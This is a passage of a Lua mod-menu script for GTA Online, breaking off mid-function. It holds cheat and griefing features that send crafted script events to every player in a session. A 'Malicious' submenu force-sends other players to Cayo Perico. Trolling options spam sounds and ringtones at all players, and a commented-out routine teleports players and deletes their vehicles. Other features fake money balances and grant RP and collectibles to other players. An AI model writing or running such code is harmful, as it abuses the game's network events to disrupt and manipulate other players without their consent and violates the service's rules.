feature["Tab 1 Y Position"].max = 100
feature["Tab 1 Y Position"].min = 0
feature["Tab 1 Y Position"].mod = 1
feature["Tab 1 Y Position"].value = 0

feature["Tab 2 Y Position"] = menu.add_feature("Tab 2 Y Position", "autoaction_value_i", localparents["Player Info Tab"].id, function(f)
end)
feature["Tab 2 Y Position"].max = 100
feature["Tab 2 Y Position"].min = 0
feature["Tab 2 Y Position"].mod = 1
feature["Tab 2 Y Position"].value = 0

feature["Tab 1 Alpha"] = menu.add_feature("Tab 1 Alpha", "autoaction_value_i", localparents["Player Info Tab"].id, function(f)
end)
feature["Tab 1 Alpha"].max = 255
feature["Tab 1 Alpha"].min = 0
feature["Tab 1 Alpha"].mod = 5
feature["Tab 1 Alpha"].value = 255

feature["Tab 2 Alpha"] = menu.add_feature("Tab 2 Alpha", "autoaction_value_i", localparents["Player Info Tab"].id, function(f)
end)
feature["Tab 2 Alpha"].max = 255
feature["Tab 2 Alpha"].min = 0
feature["Tab 2 Alpha"].mod = 5
feature["Tab 2 Alpha"].value = 255

feature["Text Font"] = menu.add_feature("Text Font", "autoaction_value_i", localparents["Player Info Tab"].id, function(f)
end)
feature["Text Font"].max = 8
feature["Text Font"].min = 0
feature["Text Font"].mod = 1
feature["Text Font"].value = 4

feature["Text Size"] = menu.add_feature("Text Size", "autoaction_value_f", localparents["Player Info Tab"].id, function(f)
end)
feature["Text Size"].max = 0.50
feature["Text Size"].min = 0.10
feature["Text Size"].mod = 0.01
feature["Text Size"].value = 0.24

localparents["Fake Money Modifier"] = menu.add_feature("Fake Money Modifier", "parent", localparents["Misc"].id)

feature["Display Current Balance"] = menu.add_feature("Display Current Balance", "toggle", localparents["Fake Money Modifier"].id, function(f)
	while f.on do
		natives.SET_MULTIPLAYER_WALLET_CASH()
		natives.SET_MULTIPLAYER_BANK_CASH()
		system.yield(0)
	end
	natives.REMOVE_MULTIPLAYER_WALLET_CASH()
	natives.REMOVE_MULTIPLAYER_BANK_CASH()
end)

feature["Wallet Money Loop"] = menu.add_feature("Wallet Money Loop", "value_str", localparents["Fake Money Modifier"].id, function(f)
	while f.on do
		system.yield(100)
		if f.value == 0 then
			natives.CHANGE_FAKE_MP_CASH(100000, 0)
		elseif f.value == 1 then
			natives.CHANGE_FAKE_MP_CASH(250000, 0)
		elseif f.value == 2 then
			natives.CHANGE_FAKE_MP_CASH(500000, 0)
		elseif f.value == 3 then
			natives.CHANGE_FAKE_MP_CASH(750000, 0)
		elseif f.value == 4 then
			natives.CHANGE_FAKE_MP_CASH(1000000, 0)
		elseif f.value == 5 then
			natives.CHANGE_FAKE_MP_CASH(2147483647, 0)
		elseif f.value == 6 then
			natives.CHANGE_FAKE_MP_CASH(math.random(2147483, 2147483647), 0)
		end
	end
end)
feature["Wallet Money Loop"]:set_str_data({"$100k", "$250k", "$500k", "$750k", "$1000k", "2147483647", "Random"})

feature["Bank Money Loop"] = menu.add_feature("Bank Money Loop", "value_str", localparents["Fake Money Modifier"].id, function(f)
	while f.on do
		system.yield(100)
		if f.value == 0 then
			natives.CHANGE_FAKE_MP_CASH(0, 100000)
		elseif f.value == 1 then
			natives.CHANGE_FAKE_MP_CASH(0, 250000)
		elseif f.value == 2 then
			natives.CHANGE_FAKE_MP_CASH(0, 500000)
		elseif f.value == 3 then
			natives.CHANGE_FAKE_MP_CASH(0, 750000)
		elseif f.value == 4 then
			natives.CHANGE_FAKE_MP_CASH(0, 1000000)
		elseif f.value == 5 then
			natives.CHANGE_FAKE_MP_CASH(0, 2147483647)
		elseif f.value == 6 then
			natives.CHANGE_FAKE_MP_CASH(0, math.random(2147483, 2147483647))
		end
	end
end)
feature["Bank Money Loop"]:set_str_data({"$100k", "$250k", "$500k", "$750k", "$1000k", "2147483647", "Random"})

menu.add_feature("Change Wallet", "action", localparents["Fake Money Modifier"].id, function(f)
	local input_stat, input_val = input.get("", "", 999, 3)
	if input_stat == 1 then
		return HANDLER_CONTINUE
	end
	if input_stat == 2 then
		return HANDLER_POP
	end
	natives.CHANGE_FAKE_MP_CASH(math.tointeger(input_val), 0)
end)

menu.add_feature("Change Bank", "action", localparents["Fake Money Modifier"].id, function(f)
	local input_stat, input_val = input.get("", "", 999, 3)
	if input_stat == 1 then
		return HANDLER_CONTINUE
	end
	if input_stat == 2 then
		return HANDLER_POP
	end
	natives.CHANGE_FAKE_MP_CASH(0, math.tointeger(input_val))
end)

localparents["Settings"] = menu.add_feature("Settings", "parent", localparents["Local"].id)

feature["Save To Default"] = menu.add_feature("Save To Default", "action", localparents["Settings"].id, function(f)
	if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini"), "w"), "")
		for k, v in pairs(feature) do
			local Toggle = false
			local Value = false
			local String = nil
			for i = 1, #DataMain.toggle_feats do
				if feature[k].type == DataMain.toggle_feats[i] then
					Toggle = true
				end
			end
			for i = 1, #DataMain.value_feats do
				if feature[k].type == DataMain.value_feats[i] then
					Value = true
				end
			end
			if Toggle and Value then
				String = k .. "|" .. tostring(feature[k].on) .. "|" .. tostring(feature[k].value)
			elseif Toggle and not Value then
				String = k .. "|" .. tostring(feature[k].on) .. "|nil"
			elseif not Toggle and Value then
				String = k .. "|nil|" .. tostring(feature[k].value)
			end
			if String ~= nil then
				text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini"), "a"), String .. "\n")
			end
		end
		menu.notify("Successfully saved settings!", AddictScript, 6, NotifyColours["green"])
	end
end)

feature["Create New Profile"] = menu.add_feature("Create New Profile", "action", localparents["Settings"].id, function(f)
	local input_stat, input_val = input.get("Enter Profile Name", "", 16, 0)
	if input_stat == 1 then
		return HANDLER_CONTINUE
	end
	if input_stat == 2 then
		return HANDLER_POP
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, input_val .. ".ini")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, input_val .. ".ini"), "w"), "")
		for k, v in pairs(feature) do
			local Toggle = false
			local Value = false
			local String = nil
			for i = 1, #DataMain.toggle_feats do
				if feature[k].type == DataMain.toggle_feats[i] then
					Toggle = true
				end
			end
			for i = 1, #DataMain.value_feats do
				if feature[k].type == DataMain.value_feats[i] then
					Value = true
				end
			end
			if Toggle and Value then
				String = k .. "|" .. tostring(feature[k].on) .. "|" .. tostring(feature[k].value)
			elseif Toggle and not Value then
				String = k .. "|" .. tostring(feature[k].on) .. "|nil"
			elseif not Toggle and Value then
				String = k .. "|nil|" .. tostring(feature[k].value)
			end
			if String ~= nil then
				text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, input_val .. ".ini"), "a"), String .. "\n")
			end
		end
		menu.notify("Successfully created new profile!", AddictScript, 6, NotifyColours["green"])
	end
end)

local settingfeature = {}

localparents["Profiles"] = menu.add_feature("Profiles", "parent", localparents["Settings"].id, function(f)
	for k, v in pairs(settingfeature) do
		if settingfeature[k] then
			menu.delete_feature(settingfeature[k].id)
		end
	end
	local all_ini_profiles = utils.get_all_files_in_directory(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, ""), "ini")
	if #all_ini_profiles > 0 then
		for i = 1, #all_ini_profiles do
			settingfeature["" .. i .. ""] = menu.add_feature("" .. all_ini_profiles[i] .. "", "action_value_str", localparents["Profiles"].id, function(f)
				if f.value == 0 then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i])) then
						local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i]), "r")
						for line in file:lines() do
							if string.find(line, "|") then
								local parts = text_func.split_string(line, "|")
								if feature["" .. parts[1] .. ""] then
									if tostring(parts[2]) ~= "nil" then
										if tostring(parts[2]) == "true" then
											feature["" .. parts[1] .. ""].on = true
										else
											feature["" .. parts[1] .. ""].on = false
										end
									end
									if tostring(parts[3]) ~= "nil" then
										feature["" .. parts[1] .. ""].value = tonumber(parts[3])
									end
								end
							end
						end
						menu.notify("Successfully loaded profile!", AddictScript, 4, NotifyColours["green"])
					end
				elseif f.value == 1 then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i])) then
						local all_load_profiles = utils.get_all_files_in_directory(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles .. "\\Load", ""), "ini")
						for i = 1, #all_load_profiles do
							if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles .. "\\Load", all_load_profiles[i])) then
								io.remove(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles .. "\\Load", all_load_profiles[i]))
							end
						end
						text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles .. "\\Load", all_ini_profiles[i]), "w"), "")
						menu.notify("Selected Profile now loads on default!", AddictScript, 3, NotifyColours["green"])
					end
				elseif f.value == 2 then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i])) then
						text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i]), "w"), "")
						for k, v in pairs(feature) do
							local Toggle = false
							local Value = false
							local String = nil
							for a = 1, #DataMain.toggle_feats do
								if feature[k].type == DataMain.toggle_feats[a] then
									Toggle = true
								end
							end
							for a = 1, #DataMain.value_feats do
								if feature[k].type == DataMain.value_feats[a] then
									Value = true
								end
							end
							if Toggle and Value then
								String = k .. "|" .. tostring(feature[k].on) .. "|" .. tostring(feature[k].value)
							elseif Toggle and not Value then
								String = k .. "|" .. tostring(feature[k].on) .. "|nil"
							elseif not Toggle and Value then
								String = k .. "|nil|" .. tostring(feature[k].value)
							end
							if String ~= nil then
								text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i]), "a"), String .. "\n")
							end
						end
						menu.notify("Successfully saved config to Profile!", AddictScript, 3, NotifyColours["green"])
					end
				elseif f.value == 3 then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i])) then
						text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i]), "w"), "")
						menu.notify("Successfully reset Profile!", AddictScript, 3, NotifyColours["green"])
					end
				elseif f.value == 4 then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i])) then
						if all_ini_profiles[i] ~= "Default.ini" then
							io.remove(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, all_ini_profiles[i]))
							menu.delete_feature(settingfeature["" .. i .. ""].id)
							menu.notify("Successfully deleted Profile!", AddictScript, 3, NotifyColours["green"])
						else
							menu.notify("You can't delete the default profile!", AddictScript, 3, NotifyColours["red"])
						end
					end
				end
			end)
			settingfeature["" .. i .. ""]:set_str_data({"Load", "Load As Default", "Save", "Reset", "Delete"})
		end
	end
end)

feature["Use Scripts As Modules"] = menu.add_feature("Use Scripts As Modules", "toggle", localparents["Settings"].id, function(f)
end)

localparents["Modules"] = menu.add_feature("Modules", "parent", localparents["Local"].id)

localparents["Online"] = menu.add_feature("Online", "parent", localparents["Addict Script"].id)

localparents["All Players"] = menu.add_feature("All Players", "parent", localparents["Online"].id)

localparents["Malicious"] = menu.add_feature("Malicious", "parent", localparents["All Players"].id)
--[[
feature["Force TP Session"] = menu.add_feature("Force TP Session", "action", localparents["Malicious"].id, function(f)
	if network.is_session_started() then
		for pid = 0, 31 do
			if player.is_player_valid(pid) and pid ~= player.player_id() then
				if utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) > 50 then
					script.trigger_script_event_2(1 << pid, ScriptEvent["Script Teleport"], player.player_id(), 1, 32, network.network_hash_from_player(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1)
				end
			end
		end
		natives.SET_FOCUS_POS_AND_VEL(246.2, -1818.77, 36.52, 0.0, 0.0, 0.0)
		local cam_ = natives.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", 246.2, -1818.77, 36.52, 0.0, 0.0, 0.0, 70.0, false, false)
		natives.SET_CAM_ACTIVE(cam_, true)
		natives.RENDER_SCRIPT_CAMS(true, false, 0, false, false, false)
		natives.SET_CAM_COORD(cam_, 246.2, -1818.77, 36.52)
		natives.SET_CAM_ROT(cam_, -90, 0, 0, 2)
		system.yield(6000)
		for pid = 0, 31 do
			if player.is_player_valid(pid) and pid ~= player.player_id() then
				if utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) > 50 and player.is_player_in_any_vehicle(pid) then
					network.request_control_of_entity(player.get_player_vehicle(pid))
				end
			end
		end
		for pid = 0, 31 do
			if player.is_player_valid(pid) and pid ~= player.player_id() then
				if utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) > 50 and player.is_player_in_any_vehicle(pid) then
					utilities.request_control(player.get_player_vehicle(pid))
					if network.has_control_of_entity(player.get_player_vehicle(pid)) then
						local vehicle_ = player.get_player_vehicle(pid)
						entity.set_entity_coords_no_offset(player.get_player_vehicle(pid), utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), 3, 1))
						system.yield(1000)
						ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
						utilities.request_control(vehicle_, 1000)
						entity_func.hard_remove_entity(vehicle_)
					end
				end
			end
		end
		natives.CLEAR_FOCUS()
		natives.SET_CAM_ACTIVE(cam_, false)
		natives.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
		natives.DESTROY_CAM(cam_, false)
	end
end)
]]
feature["Send To Cayo Perico"] = menu.add_feature("Send To Cayo Perico", "action_value_str", localparents["Malicious"].id, function(f)
        for pid = 0, 31 do
	    if player.is_player_valid(pid) then
		if f.value == 0 then
			script.trigger_script_event(-910497748, pid, {player.player_id(), 0})
		elseif f.value == 1 then
       		script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 3, 1})
		elseif f.value == 2 then
            script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 4, 1})
		elseif f.value == 3 then
            script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 4, })
		elseif f.value == 4 then
            script.trigger_script_event(-93722397, pid, {player.player_id(), pid, pid, 4, 0})
        end
	  end
	end
end):set_str_data({
	"Original",
	"Beach Party (Plane)",
	"Beach Party (Instant)",
	"Los Santos (Airport)",
	"Los Santos (Beach)"
})
--[[
feature["Lobby Bounty"] = menu.add_feature("Lobby Bounty", "toggle", localparents["Malicious"].id, function(f)
		while f.on do
		system.yield(0)
			for pid = 1, 31 do
               script_func.Bounty(pid)
				return
			end
	end
end)
]]
localparents["Trolling"] = menu.add_feature("Trolling", "parent", localparents["All Players"].id)

feature["Earrape Everyone"] = menu.add_feature("Earrape Everyone", "action", localparents["Trolling"].id, function(f)
	for i = 0, 100 do
		for pid = 0, 31 do
			audio.play_sound_from_coord(-1, "BED", player.get_player_coords(pid), "WASTEDSOUNDS", true, 9999, false)
		end
	end
end)

feature["Play Infinite Ringtone"] = menu.add_feature("Play Infinite Ringtone", "action", localparents["Trolling"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			natives.PLAY_PED_RINGTONE("Remote_Ring", player.get_player_ped(pid), true)
		end
	end
end)

feature["Stop Infinite Ringtone"] = menu.add_feature("Stop Infinite Ringtone", "action", localparents["Trolling"].id, function(f)
	for pid = 0, 31 do
		if natives.IS_PED_RINGTONE_PLAYING(player.get_player_ped(pid)) then
			natives.STOP_PED_RINGTONE(player.get_player_ped(pid))
		end
	end
end)

feature["Sainan Mode"] = menu.add_feature("Sainan Mode", "toggle", localparents["Trolling"].id, function(f)
	while f.on do
		system.yield(0)
		local peds = ped.get_all_peds()
		for i = 1, #peds do
			if not ped.is_ped_a_player(peds[i]) then
				network.request_control_of_entity(peds[i])
				natives.SET_PED_CONFIG_FLAG(peds[i], 223, f.on)
			end
		end
	end
end)

feature["POV: Black Friday"] = menu.add_feature("POV: Black Friday", "toggle", localparents["Trolling"].id, function(f)
	natives.SET_RIOT_MODE_ENABLED(f.on)
end)

localparents["Friendly"] = menu.add_feature("Friendly", "parent", localparents["All Players"].id)

localparents["Give Collectibles"] = menu.add_feature("Give Collectibles", "parent", localparents["Friendly"].id)

feature["Give RP"] = menu.add_feature("Give RP", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 5, 0, 1, 1, 1})
			system.yield(1)
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 0, i, 1, 1, 1})
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 1, i, 1, 1, 1})
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 3, i, 1, 1, 1})
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 10, i, 1, 1, 1})
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 16, i, 1, 1, 1})
				system.yield(1)
			end
			for i = 0, 1 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 2, i, 1, 1, 1})
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 6, i, 1, 1, 1})
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 17, i, 1, 1, 1})
				system.yield(1)
			end
			for i = 0, 19 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 4, i, 1, 1, 1})
				system.yield(1)
			end
			for i = 0, 99 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {pid, 9, i, 1, 1, 1})
				system.yield(1)
			end
		end
	end
end)

feature["Give Movie Props"] = menu.add_feature("Give Movie Props", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 0, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Hidden Caches"] = menu.add_feature("Give Hidden Caches", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 1, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Treasure Chests"] = menu.add_feature("Give Treasure Chests", "action", localparents["Give Collectibles"].id, function(f)
system.yield(0)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 2, 0, 1, 1, 1})
			script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 2, 1, 1, 1, 1})
		end
	end
end)

feature["Give Radio Antennas"] = menu.add_feature("Give Radio Antennas", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 3, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Media USBs"] = menu.add_feature("Give Media USBs", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 19 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Shipwrecks"] = menu.add_feature("Give Shipwrecks", "action", localparents["Give Collectibles"].id, function(f)
system.yield(0)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 5, 0, 1, 1, 1})
		end
	end
end)

feature["Give Burried Stashes"] = menu.add_feature("Give Burried Stashes", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 6, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give LD Organics Product"] = menu.add_feature("Give LD Organics Product", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 9, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Junk Energy Skydives"] = menu.add_feature("Give Junk Energy Skydives", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 10, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Tuner Collectibles"] = menu.add_feature("Give Tuner Collectibles", "action", localparents["Give Collectibles"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Tuner Collectibles"] = menu.add_feature("Give Tuner Collectibles", "action", localparents["Friendly"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give Snowmen"] = menu.add_feature("Give Snowmen", "action", localparents["Friendly"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 16, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Give G's Caches"] = menu.add_feature("Give G's Caches", "action", localparents["Friendly"].id, function(f)
	for pid = 0, 31 do
		if player.is_player_valid(pid) then
			for i = 0, 9 do
				script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 17, i, 1, 1, 1})
			end
		end
		system.yield(0)
	end
end)

feature["Rank Everyone UP"] = menu.add_feature("Rank Everyone UP", "toggle", localparents["Friendly"].id, function(f) --Credit to Jrukii
while f.on do
system.yield(0)
    for pid = 0, 31 do
	for i = 1, 20 do
	if player.is_player_valid(pid) then
	if script_func.get_player_rank(pid) < 150 then
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 8, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 9, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 1, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 8, -4, 1, 1, 1})
	system.yield(1)
	           end
			 end
           end
        end
    end
end)

feature["Lobby Off The Radar"] = menu.add_feature("Lobby Off The Radar", "toggle", localparents["Friendly"].id, function(f)
        while f.on do
            for pid = 0, 31 do
			if player.is_player_valid(pid) then
                    script.trigger_script_event(-162943635, pid, {player.player_id(), utils.time() - 60, utils.time(), 1, 1, script_func.get_global_main(pid)})
                end

            end
            system.yield(0)
        end
    end)
	
feature["Never Wanted"] = menu.add_feature("Never Wanted", "toggle", localparents["Friendly"].id, function(f)
        while f.on do
            for pid = 0, 31 do
            if player.get_player_wanted_level(pid) > 0 then
            script.trigger_script_event(1071490035, pid, {player.player_id(), 0, 0, utils.time_ms(), 0, script_func.get_global_main(pid)})
			system.wait(5000)
                end

            end
            system.yield(0)
        end
    end)

feature["Give All Weapons"] = menu.add_feature("Give All Weapons", "action", localparents["Friendly"].id, function(f)
system.yield(0)
for pid = 0, 31 do
if player.is_player_valid(pid) then
	for i = 1, #DataMain.all_weapon_hashes do
		weapon.give_delayed_weapon_to_ped(player.get_player_ped(pid), DataMain.all_weapon_hashes[i], 0, false)
		system.yield(500)
		weapon.set_ped_ammo(player.get_player_ped(pid), DataMain.all_weapon_hashes[i], select(2, weapon.get_max_ammo(player.get_player_ped(pid), DataMain.all_weapon_hashes[i])))
	end
	end
	end
end)

localparents["Lobby"] = menu.add_feature("Lobby", "parent", localparents["Online"].id)

feature["Join New Session"] = menu.add_feature("Join New Session", "action", localparents["Lobby"].id, function(f)
	menu.get_feature_by_hierarchy_key("online.lobby.join_new_lobby"):toggle()
end)

feature["Bail/Netsplit"] = menu.add_feature("Bail/Netsplit", "action", localparents["Lobby"].id, function(f)
	menu.get_feature_by_hierarchy_key("online.lobby.bail_netsplit"):toggle()
end)

feature["Force To Singleplayer"] = menu.add_feature("Force To Singleplayer", "action_value_str", localparents["Lobby"].id, function(f)
	if natives.NETWORK_CAN_BAIL() then
		if f.value == 0 then
			natives.NETWORK_BAIL(0, 0, 0)
		elseif f.value == 1 then
			natives.NETWORK_SESSION_END(false, true)
		elseif f.value == 2 then
			natives.NETWORK_SESSION_LEAVE_SINGLE_PLAYER()
		end
	end
end)
feature["Force To Singleplayer"]:set_str_data({"v1", "v2", "v3"})

localparents["Services"] = menu.add_feature("Services", "parent", localparents["Lobby"].id)

feature["Remote Orbital Strike"] = menu.add_feature("Remote Orbital Strike", "toggle", localparents["Services"].id, function(f)
	if not script_func.is_loading_into_session() and not entity.is_entity_dead(player.get_player_ped(player.player_id())) then
		script.set_global_i(2689235 + 1 + (player.player_id() * 453) + 416, script.get_global_i(2689235 + 1 + (player.player_id() * 453) + 416) | 1 << 0)
		natives.START_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
		natives.DO_SCREEN_FADE_OUT(500)
		system.yield(500)
		local orbital_cannon_cam_cam = natives.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", player.get_player_coords(player.player_id()) + v3(0, 0, 30), v3(-90, 0, 0), 70.0, false, false)
		local orbital_cannon_blip = ui.add_blip_for_coord(v3(0, 0, 0))
		ui.set_blip_sprite(orbital_cannon_blip, 390)
		natives.SET_CAM_ACTIVE(orbital_cannon_cam_cam, true)
		natives.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
		natives.DO_SCREEN_FADE_IN(500)
		system.yield(500)
		while f.on do
			if script_func.is_loading_into_session() or entity.is_entity_dead(player.get_player_ped(player.player_id())) then
				f.on = false
			end
			for pid = 0, 31 do
				if player.is_player_valid(pid) then
					if interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not natives.IS_ENTITY_GHOSTED_TO_LOCAL_PLAYER(player.get_player_ped(pid)) and not script_func.is_player_passive(pid) then
						natives.REQUEST_STREAMED_TEXTURE_DICT("helicopterhud", false)
						if natives.HAS_STREAMED_TEXTURE_DICT_LOADED("helicopterhud") then
							local sizeY = 0.013 * natives.GET_ASPECT_RATIO(false)
							local size = (((1 - (natives.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0)) * 1.0 + (natives.GET_CAM_FOV(orbital_cannon_cam_cam) / 110.0) * 0.5) * 0.03)
							natives.SET_DRAW_ORIGIN(player.get_player_coords(pid), 0)
							natives.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5, -size, 0.013, sizeY, 0.0, 190, 255, 190, 255, true, 0)
							natives.DRAW_SPRITE("helicopterhud", "hud_corner",  size * 0.5, -size, 0.013, sizeY, 90.0, 190, 255, 190, 255, true, 0)
							natives.DRAW_SPRITE("helicopterhud", "hud_corner", -size * 0.5,  size, 0.013, sizeY, 270., 190, 255, 190, 255, true, 0)
							natives.DRAW_SPRITE("helicopterhud", "hud_corner",  size * 0.5,  size, 0.013, sizeY, 180., 190, 255, 190, 255, true, 0)
							natives.CLEAR_DRAW_ORIGIN()
						end
					end
				end
			end
			ui.set_blip_coord(orbital_cannon_blip, natives.GET_CAM_COORD(orbital_cannon_cam_cam))
			for i = 6, 9 do
				ui.hide_hud_component_this_frame(i)
			end
			natives.DISABLE_ALL_CONTROL_ACTIONS(0)
			for i = 0, 6 do
				natives.ENABLE_CONTROL_ACTION(0, i, true)
			end
			for i = 199, 202 do
				natives.ENABLE_CONTROL_ACTION(0, i, true)
			end
			for i = 14, 15 do
				natives.ENABLE_CONTROL_ACTION(0, i, true)
			end
			natives.ENABLE_CONTROL_ACTION(0, 177, true)
			natives.ENABLE_CONTROL_ACTION(0, 237, true)
			natives.ENABLE_CONTROL_ACTION(0, 20, true)
			natives.ENABLE_CONTROL_ACTION(0, 246, true)
			natives.ENABLE_CONTROL_ACTION(0, 245, true)
			natives.CASCADE_SHADOWS_SET_AIRCRAFT_MODE(true)
			natives.SET_MINIMAP_IN_SPECTATOR_MODE(true, player.get_player_ped(player.player_id()))
			natives.REQUEST_ADDITIONAL_COLLISION_AT_COORD(player.get_player_coords(player.player_id()))
			natives.SET_FOCUS_POS_AND_VEL(natives.GET_CAM_COORD(orbital_cannon_cam_cam), 0.0, 0.0, 0.0)
			natives.LOCK_MINIMAP_POSITION(natives.GET_CAM_COORD(orbital_cannon_cam_cam).x, natives.GET_CAM_COORD(orbital_cannon_cam_cam).y)
			natives.NETWORK_SET_IN_FREE_CAM_MODE(true)
			local orbital_cannon_cam = graphics.request_scaleform_movie("ORBITAL_CANNON_CAM")
			if graphics.has_scaleform_movie_loaded(orbital_cannon_cam) then
				graphics.begin_scaleform_movie_method(orbital_cannon_cam, "SET_ZOOM_LEVEL")
				graphics.scaleform_movie_method_add_param_float(0.0)
				graphics.end_scaleform_movie_method()
